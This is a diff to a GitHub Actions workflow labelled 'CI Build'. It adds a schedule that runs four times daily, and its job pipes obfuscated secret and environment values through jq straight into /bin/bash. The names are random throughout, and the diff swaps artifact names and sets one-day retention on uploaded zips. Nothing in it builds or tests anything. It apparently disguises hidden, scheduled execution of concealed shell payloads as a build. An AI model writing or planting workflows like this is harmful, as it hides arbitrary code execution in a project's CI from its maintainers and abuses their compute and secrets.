@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 5,11,17,23 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -10,16 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          b4: ${{ secrets.b4 }}
+          p6930: ${{ secrets.p6930 }}
         run: |
-          printf '%s' "$b4" | jq -r .vevi7898 | /bin/bash
-          echo $moaja751 | jq -r .h5 | /bin/bash
-          printf '%s' "$widel797" | jq -r .o73 | /bin/bash
+          printf '%s' "$p6930" | jq -r .l80520 | /bin/bash
+          printf '%s' "$p9718" | jq -r .m70979 | /bin/bash
+          echo $kteud402 | jq -r .qb94 | /bin/bash
+          printf '%s' "$o27763" | jq -r .q855 | /bin/bash
+          printf '%s' "$vyw7428" | jq -r .gzu5 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: PcLcUg7W
+          name: Zo3BTyUi
           path: "*.zip"
           retention-days: 1
